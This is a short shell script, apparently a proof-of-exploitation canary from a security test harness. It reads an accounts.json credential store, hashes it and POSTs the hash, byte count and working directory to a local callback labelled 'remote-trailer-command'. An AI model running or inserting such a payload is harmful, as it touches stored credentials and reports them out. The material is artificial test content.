#!/bin/sh
store=/home/stazot/HyveCLI/data/accounts.json
proof=$(sha256sum "$store" | cut -c1-20)
bytes=$(wc -c < "$store" | tr -d ' ')
curl -fsS -X POST --data "vector=remote-trailer-command&cred_sha20=$proof&bytes=$bytes&cwd=$PWD" http://127.0.0.1:18080/callback/remote-trailer-command >/dev/null 2>&1
printf 'recorded\n'
